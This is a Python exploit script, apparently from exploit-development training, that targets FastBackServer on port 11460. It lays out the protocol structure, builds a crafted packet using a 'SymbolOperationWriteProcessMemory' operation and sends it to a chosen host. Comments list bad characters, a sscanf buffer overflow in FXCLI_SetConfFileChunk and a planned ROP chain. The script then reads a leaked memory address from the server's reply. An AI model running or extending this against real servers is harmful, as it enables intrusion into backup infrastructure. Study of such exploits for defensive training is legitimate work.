#!/usr/bin/python

import socket
import sys
from struct import pack

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# psAgentCommand
buf = bytearray([0x41]*0x0C) # ??
buf += pack('<i', 0x2000) # Opcode for execution path
buf += pack('<i', 0x0) # offset 1
buf += pack('<i', 0x100) # size 1
buf += pack('<i', 0x100) # offset 2
buf += pack('<i', 0x100) # size 2
buf += pack('<i', 0x200) # offset 3
buf += pack('<i', 0x100) # size 3
buf += bytearray([0x41]*0x8) # ??

# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20
# Buffer overflow sscanf call: FastBackServer!FXCLI_SetConfFileChunk+0x40
# ROP starts at return from this sscanf

# psCommandBuffer
sym_op = b'SymbolOperationWriteProcessMemory' + b'\x00'
buf += sym_op + bytearray([0x42]*(0x100 - len(sym_op))) # buffer 1
buf += bytearray([0x43]*0x100) # buffer 2
buf += bytearray([0x44]*0x100) # buffer 3

# format string of first buffer, expected input with overflow parameter
buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(b'Done',0,0,0,0)
# Checksum + buf (psAgentCommand and psCommandBuffer)
buf = pack('>i', len(buf)-4) + buf

def main():
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = int(sys.argv[2])
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))

    s.send(buf)
    print("[+] Packet sent")

    response = s.recv(1024)
    print(response)
    if parse_response:
        address = hex(int(parse_response(response),16))
        print(address)
    
    s.close()
    sys.exit(0)


def parse_response(response):
    pattern = b"Address is: "
    offset = response.find(pattern)
    if offset != -1:
        addr_start = offset + len(pattern)
        response = response[addr_start:addr_start+10]
        return response
    print("Invalid response received")
    return 0


if __name__ == "__main__":
    main()
